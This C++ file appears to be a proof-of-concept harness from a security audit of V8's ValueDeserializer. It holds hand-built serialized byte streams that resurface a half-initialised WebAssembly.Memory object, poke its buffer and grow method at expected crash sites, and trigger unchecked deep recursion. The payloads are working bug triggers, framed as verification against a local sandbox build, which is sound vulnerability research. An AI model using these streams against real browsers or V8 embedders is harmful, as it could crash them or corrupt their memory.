// PoC verification harness for V8 ValueDeserializer kWasmMemoryTransfer bugs.
// Works only against the sandbox build at /tmp/v8-audit/build/v8/out/d.
//
// Modes:
//   c1     : multi-value stream; value1 = kWasmMemoryTransfer whose inner
//            object is a NON-SHARED (empty) ArrayBuffer -> ReadWasmMemory
//            allocates+registers a WasmMemoryObject with null backing store,
//            then fails; value2 = kObjectReference(0) resurfaces it; then
//            from JS: wmo.buffer / wmo.grow(0).
//   c1sab  : same, but inner object is kSharedArrayBuffer transferred via
//            delegate where GetSharedArrayBufferFromId fails (browser-like).
//   c2 N   : N x (kWasmMemoryTransfer max0 mem64 0) nesting ->
//            ReadWasmMemory -> ReadObjectInternal recursion w/o STACK_CHECK.
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include "libplatform/libplatform.h"
#include "v8.h"

using v8::ArrayBuffer;
using v8::Context;
using v8::Isolate;
using v8::Local;
using v8::MaybeLocal;
using v8::SharedArrayBuffer;
using v8::String;
using v8::TryCatch;
using v8::Value;
using v8::ValueDeserializer;
using v8::WasmModuleObject;

class PoCDelegate : public ValueDeserializer::Delegate {
 public:
  MaybeLocal<WasmModuleObject> GetWasmModuleFromId(
      Isolate* isolate, uint32_t transfer_id) override {
    fprintf(stderr, "[delegate] GetWasmModuleFromId(%u) -> empty\n",
            transfer_id);
    return {};
  }
  MaybeLocal<SharedArrayBuffer> GetSharedArrayBufferFromId(
      Isolate* isolate, uint32_t clone_id) override {
    fprintf(stderr, "[delegate] GetSharedArrayBufferFromId(%u) -> empty\n",
            clone_id);
    return {};  // transfer lookup "fails" -> ReadJSArrayBuffer returns {}
  }
};

static void RunJS(Isolate* isolate, Local<Context> context,
                  const char* source_text) {
  Local<String> src =
      String::NewFromUtf8(isolate, source_text).ToLocalChecked();
  TryCatch tc(isolate);
  v8::Local<v8::Script> script;
  if (!v8::Script::Compile(context, src).ToLocal(&script)) {
    fprintf(stderr, "[js] compile failed\n");
    return;
  }
  MaybeLocal<Value> result = script->Run(context);
  if (result.IsEmpty()) {
    Local<Value> exc = tc.Exception();
    v8::String::Utf8Value utf8(isolate,
                               exc.IsEmpty() ? Local<Value>() : exc);
    fprintf(stderr, "[js] threw: %s\n",
            exc.IsEmpty() ? "(null)" : (*utf8 ? *utf8 : "(unprintable)"));
  } else {
    v8::String::Utf8Value utf8(isolate, result.ToLocalChecked());
    fprintf(stderr, "[js] returned: %s\n", *utf8 ? *utf8 : "(unprintable)");
  }
}

static void TestC1(Isolate* isolate, Local<Context> context, bool sab_fail,
                   bool grow_only, bool use_delegate) {
  fprintf(stderr, "=== C1 (%s%s%s) ===\n",
          use_delegate
              ? (sab_fail ? "delegate SAB lookup fails" : "inner non-shared AB")
              : "NO DELEGATE (control)",
          grow_only ? ", grow first" : "",
          use_delegate ? "" : " [expect ReadValue#2 EMPTY]");

  // Header: FF 10  (kVersion 16)
  // Value 1: 6D 00 00          kWasmMemoryTransfer, max_pages=0, mem64=0
  //          42 00   (c1)      inner kArrayBuffer len 0 (not shared -> fail)
  //          75 00   (c1sab)   inner kSharedArrayBuffer clone_id 0
  //                            (delegate fails -> fail)
  // Value 2: 5E 00             kObjectReference id 0  (the WMO from value 1)
  std::vector<uint8_t> stream = {0xFF, 0x10, 0x6D, 0x00, 0x00};
  if (sab_fail) {
    stream.push_back(0x75);
    stream.push_back(0x00);
  } else {
    stream.push_back(0x42);
    stream.push_back(0x00);
  }
  stream.push_back(0x5E);
  stream.push_back(0x00);

  fprintf(stderr, "[*] stream bytes:");
  for (uint8_t b : stream) fprintf(stderr, " %02x", b);
  fprintf(stderr, "\n");

  PoCDelegate delegate;
  ValueDeserializer deserializer(isolate, stream.data(), stream.size(),
                                 use_delegate ? &delegate : nullptr);
  if (!deserializer.ReadHeader(context).FromMaybe(false)) {
    fprintf(stderr, "[c1] ReadHeader FAILED\n");
    return;
  }
  fprintf(stderr, "[c1] wire version: %u\n",
          deserializer.GetWireFormatVersion());

  MaybeLocal<Value> v1;
  {
    TryCatch tc(isolate);
    v1 = deserializer.ReadValue(context);
    if (v1.IsEmpty()) {
      fprintf(stderr, "[c1] ReadValue #1 returned EMPTY (expected failure)\n");
      Local<Value> exc = tc.Exception();
      v8::String::Utf8Value utf8(isolate,
                                 exc.IsEmpty() ? Local<Value>() : exc);
      fprintf(stderr, "[c1] pending exception: %s\n",
              exc.IsEmpty() ? "(none)" : (*utf8 ? *utf8 : "?"));
    }
  }  // TryCatch dtor clears the pending exception.

  MaybeLocal<Value> v2;
  {
    TryCatch tc(isolate);
    v2 = deserializer.ReadValue(context);
    if (v2.IsEmpty()) {
      fprintf(stderr, "[c1] ReadValue #2 returned EMPTY -> NOT reachable "
                      "(bug NOT confirmed via this stream)\n");
      Local<Value> exc = tc.Exception();
      v8::String::Utf8Value utf8(isolate,
                                 exc.IsEmpty() ? Local<Value>() : exc);
      fprintf(stderr, "[c1] exception: %s\n",
              exc.IsEmpty() ? "(none)" : (*utf8 ? *utf8 : "?"));
      return;
    }
  }

  Local<Value> leaked = v2.ToLocalChecked();
  fprintf(stderr,
          "[c1] ReadValue #2 returned NON-EMPTY (id-0 object resurfaced!):\n");
  fprintf(stderr, "     IsObject=%d IsWasmMemoryObject-ish? checking via JS...\n",
          leaked->IsObject());

  // Force GC so any lazy/dangling state settles, then expose to JS and poke.
  isolate->RequestGarbageCollectionForTesting(
      Isolate::kFullGarbageCollection);

  context->Global()
      ->Set(context, String::NewFromUtf8Literal(isolate, "wmo"), leaked)
      .FromJust();
  fprintf(stderr, "[js] typeof wmo = ");
  RunJS(isolate, context, "typeof wmo");
  fprintf(stderr, "[js] wmo instanceof WebAssembly.Memory => ");
  RunJS(isolate, context, "wmo instanceof WebAssembly.Memory");
  if (grow_only) {
    fprintf(stderr, "[js] now calling wmo.grow(0) (expected crash site B)...\n");
    RunJS(isolate, context, "'' + wmo.grow(0)");
    fprintf(stderr, "[c1] SURVIVED .grow(0) (no crash)\n");
    return;
  }
  fprintf(stderr, "[js] now touching wmo.buffer (expected crash site A)...\n");
  RunJS(isolate, context, "'' + wmo.buffer");
  fprintf(stderr, "[c1] SURVIVED .buffer access (no crash)\n");
  fprintf(stderr, "[js] now calling wmo.grow(0) (expected crash site B)...\n");
  RunJS(isolate, context, "'' + wmo.grow(0)");
  fprintf(stderr, "[c1] SURVIVED .grow(0) (no crash)\n");
}

static void TestC2(Isolate* isolate, Local<Context> context, unsigned depth) {
  fprintf(stderr, "=== C2: %u nested kWasmMemoryTransfer ===\n", depth);
  std::vector<uint8_t> stream;
  stream.reserve(3 + depth * 3 + 2);
  stream.push_back(0xFF);
  stream.push_back(0x10);
  for (unsigned i = 0; i < depth; i++) {
    stream.push_back(0x6D);  // kWasmMemoryTransfer
    stream.push_back(0x00);  // max_pages = 0
    stream.push_back(0x00);  // mem64 = false
  }
  stream.push_back(0x42);  // innermost: kArrayBuffer len 0 (fails eventually)
  stream.push_back(0x00);
  fprintf(stderr, "[c2] stream size: %zu bytes\n", stream.size());
  fflush(stderr);

  PoCDelegate delegate;
  ValueDeserializer deserializer(isolate, stream.data(), stream.size(),
                                 &delegate);
  if (!deserializer.ReadHeader(context).FromMaybe(false)) {
    fprintf(stderr, "[c2] ReadHeader FAILED\n");
    return;
  }
  TryCatch tc(isolate);
  MaybeLocal<Value> v = deserializer.ReadValue(context);
  if (v.IsEmpty()) {
    Local<Value> exc = tc.Exception();
    v8::String::Utf8Value utf8(isolate, exc.IsEmpty() ? Local<Value>() : exc);
    fprintf(stderr, "[c2] ReadValue returned EMPTY, exception: %s\n",
            exc.IsEmpty() ? "(none)" : (*utf8 ? *utf8 : "?"));
    fprintf(stderr, "[c2] GRACEFUL failure (no crash)\n");
  } else {
    fprintf(stderr, "[c2] ReadValue returned a value (unexpected)\n");
  }
}

int main(int argc, char* argv[]) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s c1|c1sab|c1grow|c1ctrl|c1ctrlsab|c2 [depth]\n",
            argv[0]);
    return 64;
  }
  std::string mode = argv[1];
  unsigned depth = argc > 2 ? (unsigned)strtoul(argv[2], nullptr, 0) : 300000;

  v8::V8::InitializeICUDefaultLocation(argv[0]);
  v8::V8::InitializeExternalStartupData(argv[0]);
  v8::V8::SetFlagsFromString("--expose-gc");
  std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
  v8::V8::InitializePlatform(platform.get());
  v8::V8::Initialize();

  Isolate::CreateParams create_params;
  create_params.array_buffer_allocator =
      ArrayBuffer::Allocator::NewDefaultAllocator();
  Isolate* isolate = Isolate::New(create_params);
  {
    Isolate::Scope isolate_scope(isolate);
    v8::HandleScope handle_scope(isolate);
    Local<Context> context = Context::New(isolate);
    Context::Scope context_scope(context);

    if (mode == "c1") TestC1(isolate, context, false, false, true);
    else if (mode == "c1sab") TestC1(isolate, context, true, false, true);
    else if (mode == "c1grow") TestC1(isolate, context, false, true, true);
    else if (mode == "c1ctrl") TestC1(isolate, context, false, false, false);
    else if (mode == "c1ctrlsab") TestC1(isolate, context, true, false, false);
    else if (mode == "c2") TestC2(isolate, context, depth);
    else {
      fprintf(stderr, "unknown mode %s\n", mode.c_str());
      return 64;
    }
  }
  isolate->Dispose();
  v8::V8::Dispose();
  v8::V8::DisposePlatform();
  fprintf(stderr, "[*] clean exit\n");
  return 0;
}
